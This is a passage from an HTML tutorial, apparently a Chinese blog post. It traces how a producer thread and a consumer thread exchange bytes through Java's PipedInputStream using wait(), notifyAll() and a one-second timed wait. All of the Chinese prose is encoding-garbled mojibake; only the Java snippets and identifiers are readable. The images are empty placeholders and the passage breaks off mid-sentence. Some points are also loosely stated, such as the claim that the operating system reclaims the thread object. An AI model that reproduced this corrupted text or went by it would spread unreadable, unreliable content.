é”å¾ªç¯è¯»åˆ°byteæ•°ç»„bä¸­å†å¤„ç†æ—¶1ä¸ªç”Ÿäº§è€…çº¿ç¨‹å’Œ1ä¸ªæ¶ˆè´¹è€…çº¿ç¨‹å¤„ç†æ•°æ®çš„è¿‡ç¨‹\">3.2.1ã€åŠ é”å¾ªç¯å†™å’ŒéåŠ é”å¾ªç¯è¯»åˆ°byte[]æ•°ç»„bä¸­å†å¤„ç†æ—¶1ä¸ªç”Ÿäº§è€…çº¿ç¨‹å’Œ1ä¸ªæ¶ˆè´¹è€…çº¿ç¨‹å¤„ç†æ•°æ®çš„è¿‡ç¨‹</h6>\n<p>â€ƒâ€ƒæ ‡é¢˜3.2ä¸­çš„ä»£ç çš„æ•´ä¸ªæ‰§è¡Œè¿‡ç¨‹å¦‚ä¸‹ï¼š<br />\nâ‘ ã€mainçº¿ç¨‹åˆå§‹åŒ–ä¸€ä¸ªç¼“å†²åŒºï¼ˆbyte[]æ•°ç»„ï¼‰ï¼Œé•¿åº¦ä¸º1024ï¼ˆé»˜è®¤å€¼ï¼‰ï¼Œå¦‚ä¸‹æ‰€ç¤ºï¼š<br />\n<img alt=\"clipboard\" class=\"lazyload\" /></p>\n<p>â‘¡ã€ç„¶åç”Ÿäº§è€…çº¿ç¨‹é€šè¿‡ä¸æ–­çš„å‹æ ˆæ¥å®Œæˆå‡½æ•°ä¹‹é—´çš„è°ƒç”¨ï¼Œæœ€ç»ˆæ‰§è¡ŒPipedInputStream.class::receive(byte b[], int off, int len)å‡½æ•°æ¥å¯¹ç¼“å†²åŒºï¼ˆbyte[]æ•°ç»„ï¼‰è¿›è¡Œå¡«å……ï¼Œå¹¶ä¸”å…ˆåœ¨è‡ªå·±çš„çº¿ç¨‹æ ˆä¸­æ›´æ–°inï¼ˆå†™æŒ‡é’ˆï¼‰=17ï¼Œoutï¼ˆè¯»æŒ‡é’ˆï¼‰=0ï¼ŒwriteSide=å½“å‰è¿™ä¸ªç”Ÿäº§è€…çº¿ç¨‹ï¼ˆThreadï¼‰å¯¹è±¡ å¦‚ä¸‹æ‰€ç¤ºï¼š<br />\n<img alt=\"clipboard\" class=\"lazyload\" /><br />\n<img alt=\"clipboard\" class=\"lazyload\" /></p>\n<p>å½“ç”Ÿäº§è€…çº¿ç¨‹å¯¹ç¼“å†²åŒºï¼ˆbyte[]æ•°ç»„ï¼‰å¡«å……å®Œæˆä¹‹åï¼Œå†æ‰§è¡Œæ ‡é¢˜3.2ä¸­çš„ä»£ç </p>\n<pre><code>input.wait();\n</code></pre>\n<p>è¿™è¡Œä»£ç ä¼šé‡Šæ”¾é”å¹¶è®©ç”Ÿäº§è€…çº¿ç¨‹è¿›å…¥æ— é™ç­‰å¾…ï¼Œç›´åˆ°æ¶ˆè´¹è€…çº¿ç¨‹consumeræ‰§è¡ŒnotifyAll()å‡½æ•°æ¥å”¤é†’å½“å‰è¿™ä¸ªç”Ÿäº§è€…çº¿ç¨‹ã€‚åœ¨è¿™ä¹‹å‰ï¼Œç”Ÿäº§è€…çº¿ç¨‹ä¼šå°†è‡ªå·±çº¿ç¨‹æ ˆä¸­çš„inï¼ˆå†™æŒ‡é’ˆï¼‰=17ï¼Œoutï¼ˆè¯»æŒ‡é’ˆï¼‰=0ï¼ŒwriteSide=å½“å‰è¿™ä¸ªç”Ÿäº§è€…çº¿ç¨‹ï¼Œè¿™3ä¸ªå˜é‡æ›´æ–°åˆ°ä¸»å†…å­˜ï¼ˆä¹Ÿå°±æ˜¯å †ï¼‰ä¸­çš„PipedInputStreamå¯¹è±¡ä¸­ã€‚<br />\n<img alt=\"clipboard\" class=\"lazyload\" /></p>\n<p>â‘¢ã€æ¶ˆè´¹è€…çº¿ç¨‹è¯»ç¼“å†²åŒºï¼ˆbyte[]æ•°ç»„ï¼‰çš„è¿‡ç¨‹ä¹Ÿæ˜¯é€šè¿‡ä¸æ–­çš„å‹æ ˆæ¥å®Œæˆå‡½æ•°ä¹‹é—´çš„è°ƒç”¨ï¼Œæœ€ç»ˆæ‰§è¡ŒPipedInputStream::read()å‡½æ•°ï¼ˆè¯•æ¢æ€§çš„è¯»å–1ä¸ªå­—èŠ‚ï¼‰å’ŒPipedInputStream::read(byte b[], int off, int len)å‡½æ•°ï¼ˆè¯»å–å‰©ä½™å…¶å®ƒçš„å­—èŠ‚ï¼‰å°†æ­¥éª¤â‘¡ä¸­ç”Ÿäº§è€…çº¿ç¨‹å†™å…¥åˆ°ç¼“å†²åŒºï¼ˆbyte[]æ•°ç»„ï¼‰ä¸­çš„17ä¸ªå­—èŠ‚è¯»å–å‡ºæ¥<br />\n<img alt=\"clipboard\" class=\"lazyload\" /><br />\n<img alt=\"clipboard\" class=\"lazyload\" /><br />\n<img alt=\"clipboard\" class=\"lazyload\" /></p>\n<blockquote>\n<p>é™„è¨€ï¼šæœ€ç»ˆæ¶ˆè´¹è€…çº¿ç¨‹ä¹Ÿä¼šå°†è‡ªå·±çº¿ç¨‹æ ˆä¸­çš„inï¼ˆå†™æŒ‡é’ˆï¼‰= -1ï¼Œoutï¼ˆè¯»æŒ‡é’ˆï¼‰= 17ï¼ŒwriteSide=å½“å‰è¿™ä¸ªæ¶ˆè´¹è€…çº¿ç¨‹ï¼Œè¿™3ä¸ªå˜é‡æ›´æ–°åˆ°ä¸»å†…å­˜ï¼ˆä¹Ÿå°±æ˜¯å †ï¼‰ä¸­çš„PipedInputStreamå¯¹è±¡ä¸­ã€‚</p>\n</blockquote>\n<p>å› æ­¤ï¼Œæœ¬æ¬¡æ¶ˆè´¹è€…çº¿ç¨‹ä»ç¼“å†²åŒºï¼ˆbyte[]æ•°ç»„ï¼‰ä¸­è¯»æ•°æ®çš„è¿‡ç¨‹ä¸­æ²¡æœ‰æ‰§è¡Œread()å‡½æ•°ä¸­çš„wait(1000)è¿™ä¸€è¡Œä»£ç ï¼Œå¦‚ä¸‹ï¼š<br />\n<img alt=\"clipboard\" class=\"lazyload\" /></p>\n<p>æ‰€ä»¥ï¼Œæœ¬æ¬¡æ¶ˆè´¹è€…çº¿ç¨‹ä»ç¼“å†²åŒºï¼ˆbyte[]æ•°ç»„ï¼‰ä¸­è¯»å–æ•°æ®åˆ°æ¶ˆè´¹è€…çº¿ç¨‹ä¸­è‡ªå·±åˆ›å»ºçš„byte[]æ•°ç»„ä¸­æ—¶ï¼ŒåªèŠ±è´¹äº†0msï¼š<br />\n<img alt=\"clipboard\" class=\"lazyload\" /></p>\n<p>æ¥ä¸‹æ¥ï¼Œå½“æ¶ˆè´¹è€…çº¿ç¨‹å°†æ­¥éª¤â‘¡ä¸­ç”Ÿäº§è€…çº¿ç¨‹å†™å…¥åˆ°ç¼“å†²åŒºï¼ˆbyte[]æ•°ç»„ï¼‰ä¸­çš„17ä¸ªå­—èŠ‚è¯»å–å‡ºæ¥ä»¥åï¼ˆé€šè¿‡System.arraycopy()å‡½æ•°å¤åˆ¶åˆ°äº†æ¶ˆè´¹è€…çº¿ç¨‹ä¸­è‡ªå·±åˆ›å»ºçš„byte[]æ•°ç»„ä¸­ï¼‰ï¼Œæ¶ˆè´¹è€…çº¿ç¨‹ä¼šéå†ä»ç¼“å†²åŒºè¯»åˆ°çš„è¿™ä¸ªbyte[]æ•°ç»„ï¼Œæ¥å¤„ç†è¿™äº›æ•°æ®ï¼Œå¦‚ä¸‹æ‰€ç¤ºï¼ˆæ ‡é¢˜3.2ä¸­çš„ä»£ç ç‰‡æ®µï¼‰ï¼š</p>\n<pre><code>                   //æ ‡é¢˜3.2ä¸­çš„ä»£ç ç‰‡æ®µ\n                   for (int i = 0; i &lt; readBytes; i++) {\n                     System.out.print((char) b[i]);//æ¨¡æ‹Ÿå¤„ç†å­—èŠ‚æ•°æ®\n                  }\n</code></pre>\n<p>ç„¶åï¼Œå½“æ¶ˆè´¹è€…çº¿ç¨‹å†æ¬¡æ‰§è¡Œ</p>\n<pre><code>//æ ‡é¢˜3.2ä¸­çš„ä»£ç ç‰‡æ®µ\ninput.read(b, 0, b.length)\n</code></pre>\n<p>ä»ç¼“å†²åŒºï¼ˆbyte[]æ•°ç»„ï¼‰ä¸­è¯»æ•°æ®åˆ°è‡ªå·±åˆ›å»ºçš„byte[]æ•°ç»„ä¸­æ—¶ï¼Œç”±äºæ­¤æ—¶inï¼ˆå†™æŒ‡é’ˆï¼‰=-1ï¼Œå¹¶ä¸”å½“ä¸‹å›¾ä¸­çš„å…¶å®ƒ5ä¸ªæ¡ä»¶éƒ½ä¸æˆç«‹æ—¶ï¼Œå”¤é†’æ‰§è¡Œäº†</p>\n<pre><code>input.wait()\n</code></pre>\n<p>çš„ç”Ÿäº§è€…çº¿ç¨‹ï¼Œç„¶åå½“å‰è¿™ä¸ªæ­£åœ¨ä»ç¼“å†²åŒº(byteæ•°ç»„)ä¸­è¯»æ•°æ®çš„æ¶ˆè´¹è€…çº¿ç¨‹æ‰§è¡Œwait 1000ms ï¼Œå¦‚ä¸‹ï¼š<br />\n<img alt=\"clipboard\" class=\"lazyload\" /><br />\n<img alt=\"clipboard\" class=\"lazyload\" /></p>\n<p>â‘£ã€å½“ç”Ÿäº§è€…çº¿ç¨‹è¢«æ¶ˆè´¹è€…çº¿ç¨‹æ‰§è¡Œçš„</p>\n<pre><code>notifyAll();\n</code></pre>\n<p>å”¤é†’ä¹‹åï¼Œä¼šå†æ¬¡é€šè¿‡ä¸æ–­çš„å‹æ ˆæ¥å®Œæˆå‡½æ•°ä¹‹é—´çš„è°ƒç”¨ï¼Œå†æ¬¡æ‰§è¡ŒPipedInputStream.class::receive(byte b[], int off, int len)å‡½æ•°æ¥å¯¹ç¼“å†²åŒºï¼ˆbyte[]æ•°ç»„ï¼‰è¿›è¡Œå¡«å……ï¼Œå¹¶ä¸”å…ˆåœ¨è‡ªå·±çš„çº¿ç¨‹æ ˆä¸­å…ˆæ›´æ–°inï¼ˆå†™æŒ‡é’ˆï¼‰=17ï¼Œoutï¼ˆè¯»æŒ‡é’ˆï¼‰=0ï¼ŒwriteSide=å½“å‰è¿™ä¸ªç”Ÿäº§è€…çº¿ç¨‹ï¼ˆThreadï¼‰å¯¹è±¡ å¦‚ä¸‹æ‰€ç¤ºï¼š<br />\n<img alt=\"clipboard\" class=\"lazyload\" /><br />\n<img alt=\"clipboard\" class=\"lazyload\" /></p>\n<p>å½“ç”Ÿäº§è€…çº¿ç¨‹å¯¹ç¼“å†²åŒºï¼ˆbyte[]æ•°ç»„ï¼‰å¡«å……å®Œæˆä¹‹åï¼Œå†æ‰§è¡Œæ ‡é¢˜3.2ä¸­çš„ä»£ç </p>\n<pre><code>input.wait();\n</code></pre>\n<p>è¿™è¡Œä»£ç ä¼šé‡Šæ”¾é”å¹¶è®©ç”Ÿäº§è€…çº¿ç¨‹è¿›å…¥æ— é™ç­‰å¾…ï¼Œç›´åˆ°æ¶ˆè´¹è€…çº¿ç¨‹consumeræ‰§è¡ŒnotifyAll()å‡½æ•°æ¥å”¤é†’å½“å‰è¿™ä¸ªç”Ÿäº§è€…çº¿ç¨‹ã€‚åœ¨è¿™ä¹‹å‰ï¼Œç”Ÿäº§è€…çº¿ç¨‹ä¼šå°†è‡ªå·±çº¿ç¨‹æ ˆä¸­çš„inï¼ˆå†™æŒ‡é’ˆï¼‰=17ï¼Œoutï¼ˆè¯»æŒ‡é’ˆï¼‰=0ï¼ŒwriteSide=å½“å‰è¿™ä¸ªç”Ÿäº§è€…çº¿ç¨‹ï¼Œè¿™3ä¸ªå˜é‡æ›´æ–°åˆ°ä¸»å†…å­˜ï¼ˆä¹Ÿå°±æ˜¯å †ï¼‰ä¸­çš„PipedInputStreamå¯¹è±¡ä¸­ã€‚å¦‚ä¸‹æ‰€ç¤ºï¼š<br />\n<img alt=\"clipboard\" class=\"lazyload\" /></p>\n<p>â‘¤ã€æ¶ˆè´¹è€…çº¿ç¨‹åœ¨ç¬¬â‘¢æ­¥æ‰§è¡Œäº†</p>\n<pre><code>wait(1000);\n</code></pre>\n<p>åœ¨ç­‰å¾…äº†1000msä¹‹åï¼Œæ¶ˆè´¹è€…çº¿ç¨‹ä¼šè‡ªåŠ¨å”¤é†’ç»§ç»­æ‰§è¡Œï¼Œæ­¤æ—¶è‡ªå·±çº¿ç¨‹æ ˆä¸­çš„inï¼ˆå†™æŒ‡é’ˆï¼‰= -1ï¼Œoutï¼ˆè¯»æŒ‡é’ˆï¼‰= 17å·²ç»è¢«ç¬¬â‘£æ­¥ä¸­çš„ç”Ÿäº§è€…çº¿ç¨‹ä¿®æ”¹ä¸ºinï¼ˆå†™æŒ‡é’ˆï¼‰=17ï¼Œoutï¼ˆè¯»æŒ‡é’ˆï¼‰=0ï¼ˆç”Ÿäº§è€…çº¿ç¨‹ä¸ä¼šç›´æ¥ä¿®æ”¹æ¶ˆè´¹è€…çº¿ç¨‹æ ˆä¸­çš„å˜é‡ï¼Œç”Ÿäº§è€…çº¿ç¨‹ä¼šå…ˆå°†è‡ªå·±çº¿ç¨‹æ ˆä¸­inï¼ˆå†™æŒ‡é’ˆï¼‰ï¼Œoutï¼ˆè¯»æŒ‡é’ˆï¼‰å˜é‡çš„å€¼ä¿®æ”¹åˆ°ä¸»å†…å­˜ä¸­ï¼Œç„¶åæ¶ˆè´¹è€…çº¿ç¨‹ä¼šè‡ªå·±å°†ä¸»å†…å­˜ä¸­çš„è¿™2ä¸ªå˜é‡å€¼åˆ·æ–°åˆ°æ¶ˆè´¹è€…è‡ªå·±çš„çº¿ç¨‹æ ˆä¸­ï¼‰ï¼Œå¦‚ä¸‹æ‰€ç¤ºï¼š<br />\n<img alt=\"clipboard\" class=\"lazyload\" /></p>\n<p>ç„¶åæ‰§è¡ŒPipedInputStream::read()å‡½æ•°ï¼ˆè¯•æ¢æ€§çš„è¯»å–1ä¸ªå­—èŠ‚ï¼‰å’ŒPipedInputStream::read(byte b[], int off, int len)å‡½æ•°ï¼ˆè¯»å–å‰©ä½™å…¶å®ƒçš„å­—èŠ‚ï¼‰å°†æ­¥éª¤â‘£ä¸­ç”Ÿäº§è€…çº¿ç¨‹å†™å…¥åˆ°ç¼“å†²åŒºï¼ˆbyte[]æ•°ç»„ï¼‰ä¸­çš„17ä¸ªå­—èŠ‚è¯»å–å‡ºæ¥<br />\n<img alt=\"clipboard\" class=\"lazyload\" /><br />\n<img alt=\"clipboard\" class=\"lazyload\" /><br />\n<img alt=\"clipboard\" class=\"lazyload\" /></p>\n<blockquote>\n<p>é™„è¨€ï¼šæœ€ç»ˆæ¶ˆè´¹è€…çº¿ç¨‹ä¹Ÿä¼šå°†è‡ªå·±çº¿ç¨‹æ ˆä¸­çš„inï¼ˆå†™æŒ‡é’ˆï¼‰= -1ï¼Œoutï¼ˆè¯»æŒ‡é’ˆï¼‰= 17ï¼ŒwriteSide=å½“å‰è¿™ä¸ªæ¶ˆè´¹è€…çº¿ç¨‹ï¼Œè¿™3ä¸ªå˜é‡æ›´æ–°åˆ°ä¸»å†…å­˜ï¼ˆä¹Ÿå°±æ˜¯å †ï¼‰ä¸­çš„PipedInputStreamå¯¹è±¡ä¸­ã€‚</p>\n</blockquote>\n<p>ç”±äºï¼Œæœ¬æ¬¡æ¶ˆè´¹è€…çº¿ç¨‹ä»ç¼“å†²åŒºï¼ˆbyte[]æ•°ç»„ï¼‰ä¸­è¯»æ•°æ®çš„è¿‡ç¨‹æ˜¯ä»æ­¥éª¤â‘¢ä¸­è‡ªåŠ¨å”¤é†’ç»§ç»­æ‰§è¡Œçš„ï¼Œæ‰€ä»¥ï¼Œæœ¬æ¬¡æ¶ˆè´¹è€…çº¿ç¨‹ä»ç¼“å†²åŒºï¼ˆbyte[]æ•°ç»„ï¼‰ä¸­è¯»å–æ•°æ®åˆ°æ¶ˆè´¹è€…çº¿ç¨‹ä¸­è‡ªå·±åˆ›å»ºçš„byte[]æ•°ç»„ä¸­æ—¶ï¼ŒèŠ±è´¹äº†1015msï¼š<br />\n<img alt=\"clipboard\" class=\"lazyload\" /></p>\n<p>æ¥ä¸‹æ¥ï¼Œå½“æ¶ˆè´¹è€…çº¿ç¨‹å°†æ­¥éª¤â‘£ä¸­ç”Ÿäº§è€…çº¿ç¨‹å†™å…¥åˆ°ç¼“å†²åŒºï¼ˆbyte[]æ•°ç»„ï¼‰ä¸­çš„17ä¸ªå­—èŠ‚è¯»å–å‡ºæ¥ä»¥åï¼ˆé€šè¿‡System.arraycopy()å‡½æ•°å¤åˆ¶åˆ°äº†æ¶ˆè´¹è€…çº¿ç¨‹ä¸­è‡ªå·±åˆ›å»ºçš„byte[]æ•°ç»„ä¸­ï¼‰ï¼Œæ¶ˆè´¹è€…çº¿ç¨‹ä¼šéå†ä»ç¼“å†²åŒºè¯»åˆ°çš„è¿™ä¸ªbyte[]æ•°ç»„ï¼Œæ¥å¤„ç†è¿™äº›æ•°æ®ï¼Œå¦‚ä¸‹æ‰€ç¤ºï¼ˆæ ‡é¢˜3.2ä¸­çš„ä»£ç ç‰‡æ®µï¼‰ï¼š</p>\n<pre><code>                   //æ ‡é¢˜3.2ä¸­çš„ä»£ç ç‰‡æ®µ\n                   for (int i = 0; i &lt; readBytes; i++) {\n                     System.out.print((char) b[i]);//æ¨¡æ‹Ÿå¤„ç†å­—èŠ‚æ•°æ®\n                  }\n</code></pre>\n<p>ç„¶åï¼Œå½“æ¶ˆè´¹è€…çº¿ç¨‹å†æ¬¡æ‰§è¡Œ</p>\n<pre><code>//æ ‡é¢˜3.2ä¸­çš„ä»£ç ç‰‡æ®µ\ninput.read(b, 0, b.length)\n</code></pre>\n<p>ä»ç¼“å†²åŒºï¼ˆbyte[]æ•°ç»„ï¼‰ä¸­è¯»æ•°æ®åˆ°è‡ªå·±åˆ›å»ºçš„byte[]æ•°ç»„ä¸­æ—¶ï¼Œç”±äºæ­¤æ—¶inï¼ˆå†™æŒ‡é’ˆï¼‰=-1ï¼Œå¹¶ä¸”å½“ä¸‹å›¾ä¸­çš„å…¶å®ƒ5ä¸ªæ¡ä»¶éƒ½ä¸æˆç«‹æ—¶ï¼Œå”¤é†’æ‰§è¡Œäº†</p>\n<pre><code>input.wait()\n</code></pre>\n<p>çš„ç”Ÿäº§è€…çº¿ç¨‹ï¼Œç„¶åå½“å‰è¿™ä¸ªæ­£åœ¨ä»ç¼“å†²åŒº(byte[]æ•°ç»„)ä¸­è¯»æ•°æ®çš„æ¶ˆè´¹è€…çº¿ç¨‹æ‰§è¡Œwait 1000ms ï¼Œå¦‚ä¸‹ï¼š<br />\n<img alt=\"clipboard\" class=\"lazyload\" /><br />\n<img alt=\"clipboard\" class=\"lazyload\" /></p>\n<p>â‘¥ã€å½“ç”Ÿäº§è€…çº¿ç¨‹è¢«æ¶ˆè´¹è€…çº¿ç¨‹æ‰§è¡Œçš„</p>\n<pre><code>notifyAll();\n</code></pre>\n<p>å”¤é†’ä¹‹åï¼Œä¼šå†æ¬¡é€šè¿‡ä¸æ–­çš„å‹æ ˆæ¥å®Œæˆå‡½æ•°ä¹‹é—´çš„è°ƒç”¨ï¼Œå†æ¬¡æ‰§è¡ŒPipedInputStream.class::receive(byte b[], int off, int len)å‡½æ•°æ¥å¯¹ç¼“å†²åŒºï¼ˆbyte[]æ•°ç»„ï¼‰è¿›è¡Œå¡«å……ï¼Œå¹¶ä¸”å…ˆåœ¨è‡ªå·±çš„çº¿ç¨‹æ ˆä¸­å…ˆæ›´æ–°inï¼ˆå†™æŒ‡é’ˆï¼‰=17ï¼Œoutï¼ˆè¯»æŒ‡é’ˆï¼‰=0ï¼ŒwriteSide=å½“å‰è¿™ä¸ªç”Ÿäº§è€…çº¿ç¨‹ï¼ˆThreadï¼‰å¯¹è±¡ å¦‚ä¸‹æ‰€ç¤ºï¼š<br />\n<img alt=\"clipboard\" class=\"lazyload\" /><br />\n<img alt=\"clipboard\" class=\"lazyload\" /></p>\n<p>å½“ç”Ÿäº§è€…çº¿ç¨‹å¯¹ç¼“å†²åŒºï¼ˆbyte[]æ•°ç»„ï¼‰å¡«å……å®Œæˆä¹‹åï¼Œå†æ‰§è¡Œæ ‡é¢˜3.2ä¸­çš„ä»£ç </p>\n<pre><code>input.wait();\n</code></pre>\n<p>è¿™è¡Œä»£ç ä¼šé‡Šæ”¾é”å¹¶è®©ç”Ÿäº§è€…çº¿ç¨‹è¿›å…¥æ— é™ç­‰å¾…ï¼Œç›´åˆ°æ¶ˆè´¹è€…çº¿ç¨‹consumeræ‰§è¡ŒnotifyAll()å‡½æ•°æ¥å”¤é†’å½“å‰è¿™ä¸ªç”Ÿäº§è€…çº¿ç¨‹ã€‚åœ¨è¿™ä¹‹å‰ï¼Œç”Ÿäº§è€…çº¿ç¨‹ä¼šå°†è‡ªå·±çº¿ç¨‹æ ˆä¸­çš„inï¼ˆå†™æŒ‡é’ˆï¼‰=17ï¼Œoutï¼ˆè¯»æŒ‡é’ˆï¼‰=0ï¼ŒwriteSide=å½“å‰è¿™ä¸ªç”Ÿäº§è€…çº¿ç¨‹ï¼Œè¿™3ä¸ªå˜é‡æ›´æ–°åˆ°ä¸»å†…å­˜ï¼ˆä¹Ÿå°±æ˜¯å †ï¼‰ä¸­çš„PipedInputStreamå¯¹è±¡ä¸­ã€‚å¦‚ä¸‹æ‰€ç¤ºï¼š<br />\n<img alt=\"clipboard\" class=\"lazyload\" /></p>\n<p>â‘¦ã€æ¶ˆè´¹è€…çº¿ç¨‹åœ¨ç¬¬â‘¤æ­¥æ‰§è¡Œäº†</p>\n<pre><code>wait(1000);\n</code></pre>\n<p>åœ¨ç­‰å¾…äº†1000msä¹‹åï¼Œæ¶ˆè´¹è€…çº¿ç¨‹ä¼šè‡ªåŠ¨å”¤é†’ç»§ç»­æ‰§è¡Œï¼Œæ­¤æ—¶è‡ªå·±çº¿ç¨‹æ ˆä¸­çš„inï¼ˆå†™æŒ‡é’ˆï¼‰= -1ï¼Œoutï¼ˆè¯»æŒ‡é’ˆï¼‰= 17å·²ç»è¢«ç¬¬â‘¥æ­¥ä¸­çš„ç”Ÿäº§è€…çº¿ç¨‹ä¿®æ”¹ä¸ºinï¼ˆå†™æŒ‡é’ˆï¼‰=17ï¼Œoutï¼ˆè¯»æŒ‡é’ˆï¼‰=0ï¼ˆç”Ÿäº§è€…çº¿ç¨‹ä¸ä¼šç›´æ¥ä¿®æ”¹æ¶ˆè´¹è€…çº¿ç¨‹æ ˆä¸­çš„å˜é‡ï¼Œç”Ÿäº§è€…çº¿ç¨‹ä¼šå…ˆå°†è‡ªå·±çº¿ç¨‹æ ˆä¸­inï¼ˆå†™æŒ‡é’ˆï¼‰ï¼Œoutï¼ˆè¯»æŒ‡é’ˆï¼‰å˜é‡çš„å€¼ä¿®æ”¹åˆ°ä¸»å†…å­˜ä¸­ï¼Œç„¶åæ¶ˆè´¹è€…çº¿ç¨‹ä¼šè‡ªå·±å°†ä¸»å†…å­˜ä¸­çš„è¿™2ä¸ªå˜é‡å€¼åˆ·æ–°åˆ°æ¶ˆè´¹è€…è‡ªå·±çš„çº¿ç¨‹æ ˆä¸­ï¼‰ï¼Œç„¶åæ‰§è¡ŒPipedInputStream::read()å‡½æ•°ï¼ˆè¯•æ¢æ€§çš„è¯»å–1ä¸ªå­—èŠ‚ï¼‰å’ŒPipedInputStream::read(byte b[], int off, int len)å‡½æ•°ï¼ˆè¯»å–å‰©ä½™å…¶å®ƒçš„å­—èŠ‚ï¼‰å°†æ­¥éª¤â‘¥ä¸­ç”Ÿäº§è€…çº¿ç¨‹å†™å…¥åˆ°ç¼“å†²åŒºï¼ˆbyte[]æ•°ç»„ï¼‰ä¸­çš„17ä¸ªå­—èŠ‚è¯»å–å‡ºæ¥<br />\n<img alt=\"clipboard\" class=\"lazyload\" /><br />\n<img alt=\"clipboard\" class=\"lazyload\" /><br />\n<img alt=\"clipboard\" class=\"lazyload\" /></p>\n<blockquote>\n<p>é™„è¨€ï¼šæœ€ç»ˆæ¶ˆè´¹è€…çº¿ç¨‹ä¹Ÿä¼šå°†è‡ªå·±çº¿ç¨‹æ ˆä¸­çš„inï¼ˆå†™æŒ‡é’ˆï¼‰= -1ï¼Œoutï¼ˆè¯»æŒ‡é’ˆï¼‰= 17ï¼ŒwriteSide=å½“å‰è¿™ä¸ªæ¶ˆè´¹è€…çº¿ç¨‹ï¼Œè¿™3ä¸ªå˜é‡æ›´æ–°åˆ°ä¸»å†…å­˜ï¼ˆä¹Ÿå°±æ˜¯å †ï¼‰ä¸­çš„PipedInputStreamå¯¹è±¡ä¸­ã€‚</p>\n</blockquote>\n<p>ç”±äºï¼Œæœ¬æ¬¡æ¶ˆè´¹è€…çº¿ç¨‹ä»ç¼“å†²åŒºï¼ˆbyte[]æ•°ç»„ï¼‰ä¸­è¯»æ•°æ®çš„è¿‡ç¨‹æ˜¯ä»æ­¥éª¤â‘¤ä¸­è‡ªåŠ¨å”¤é†’ç»§ç»­æ‰§è¡Œçš„ï¼Œæ‰€ä»¥ï¼Œæœ¬æ¬¡æ¶ˆè´¹è€…çº¿ç¨‹ä»ç¼“å†²åŒºï¼ˆbyte[]æ•°ç»„ï¼‰ä¸­è¯»å–æ•°æ®åˆ°æ¶ˆè´¹è€…çº¿ç¨‹ä¸­è‡ªå·±åˆ›å»ºçš„byte[]æ•°ç»„ä¸­æ—¶ï¼ŒèŠ±è´¹äº†1017msï¼š<br />\n<img alt=\"clipboard\" class=\"lazyload\" /></p>\n<p>æ¥ä¸‹æ¥ï¼Œå½“æ¶ˆè´¹è€…çº¿ç¨‹å°†æ­¥éª¤â‘¥ä¸­ç”Ÿäº§è€…çº¿ç¨‹å†™å…¥åˆ°ç¼“å†²åŒºï¼ˆbyte[]æ•°ç»„ï¼‰ä¸­çš„17ä¸ªå­—èŠ‚è¯»å–å‡ºæ¥ä»¥åï¼ˆé€šè¿‡System.arraycopy()å‡½æ•°å¤åˆ¶åˆ°äº†æ¶ˆè´¹è€…çº¿ç¨‹ä¸­è‡ªå·±åˆ›å»ºçš„byte[]æ•°ç»„ä¸­ï¼‰ï¼Œæ¶ˆè´¹è€…çº¿ç¨‹ä¼šéå†ä»ç¼“å†²åŒºè¯»åˆ°çš„è¿™ä¸ªbyte[]æ•°ç»„ï¼Œæ¥å¤„ç†è¿™äº›æ•°æ®ï¼Œå¦‚ä¸‹æ‰€ç¤ºï¼ˆæ ‡é¢˜3.2ä¸­çš„ä»£ç ç‰‡æ®µï¼‰ï¼š</p>\n<pre><code>                   //æ ‡é¢˜3.2ä¸­çš„ä»£ç ç‰‡æ®µ\n                   for (int i = 0; i &lt; readBytes; i++) {\n                     System.out.print((char) b[i]);//æ¨¡æ‹Ÿå¤„ç†å­—èŠ‚æ•°æ®\n                  }\n</code></pre>\n<p>ç„¶åï¼Œå½“æ¶ˆè´¹è€…çº¿ç¨‹å†æ¬¡æ‰§è¡Œ</p>\n<pre><code>//æ ‡é¢˜3.2ä¸­çš„ä»£ç ç‰‡æ®µ\ninput.read(b, 0, b.length)\n</code></pre>\n<p>ä»ç¼“å†²åŒºï¼ˆbyte[]æ•°ç»„ï¼‰ä¸­è¯»æ•°æ®åˆ°è‡ªå·±åˆ›å»ºçš„byte[]æ•°ç»„ä¸­æ—¶ï¼Œç”±äºæ­¤æ—¶inï¼ˆå†™æŒ‡é’ˆï¼‰=-1ï¼Œå¹¶ä¸”å½“ä¸‹å›¾ä¸­çš„å…¶å®ƒ5ä¸ªæ¡ä»¶éƒ½ä¸æˆç«‹æ—¶ï¼Œå”¤é†’æ‰§è¡Œäº†</p>\n<pre><code>input.wait()\n</code></pre>\n<p>çš„ç”Ÿäº§è€…çº¿ç¨‹ï¼Œç„¶åå½“å‰è¿™ä¸ªæ­£åœ¨ä»ç¼“å†²åŒº(byte[]æ•°ç»„)ä¸­è¯»æ•°æ®çš„æ¶ˆè´¹è€…çº¿ç¨‹æ‰§è¡Œwait 1000ms ï¼Œå¦‚ä¸‹ï¼š<br />\n<img alt=\"clipboard\" class=\"lazyload\" /><br />\n<img alt=\"clipboard\" class=\"lazyload\" /></p>\n<p>â‘§ã€å½“ç”Ÿäº§è€…çº¿ç¨‹è¢«æ¶ˆè´¹è€…çº¿ç¨‹æ‰§è¡Œçš„</p>\n<pre><code>notifyAll();\n</code></pre>\n<p>å”¤é†’ä¹‹åï¼Œä¼šè·³å‡ºforå¾ªç¯ï¼Œç»“æŸç”Ÿäº§è€…çº¿ç¨‹çš„ç”Ÿå‘½å‘¨æœŸï¼Œä¹‹åï¼Œè¯¥çº¿ç¨‹å¯¹è±¡ä¼šè¢«æ“ä½œç³»ç»Ÿå›æ”¶ã€‚<br />\nâ‘¨ã€æ¶ˆè´¹è€…çº¿ç¨‹åœ¨ç¬¬â‘¦æ­¥æ‰§è¡Œäº†</p>\n<pre><code>wait(1000);\n</code></pre>\n<p>åœ¨ç­‰å¾…äº†1000msä¹‹åï¼Œæ¶ˆè´¹è€…çº¿ç¨‹ä¼šè‡ªåŠ¨å”¤é†’ç»§ç»­æ‰§è¡Œï¼Œæ­¤æ—¶è‡ªå·±çº¿ç¨‹æ ˆä¸­çš„inï¼ˆå†™æŒ‡é’ˆï¼‰= -1ï¼Œoutï¼ˆè¯»æŒ‡é’ˆï¼‰= 17ï¼Œå¹¶ä¸”ä»</p>\n<pre><code>wait(1000);\n</code></pre>\n<p>çš„ä»£ç ä¹‹åï¼Œç»§ç»­æ‰§è¡Œï¼Œæ‰§è¡Œè¿‡ç¨‹å¦‚ä¸‹ï¼ˆä»ä¸‹å›¾çš„ç´«è‰²æµç¨‹ç»§ç»­æ‰§è¡Œï¼‰ï¼š<br />\n<img alt=\"clipboard\" class=\"lazyload\" /></p>\n<p>åœ¨æ‰§è¡Œäº†2ä¸ªå¾ªç¯åï¼Œç›´åˆ°int trials = 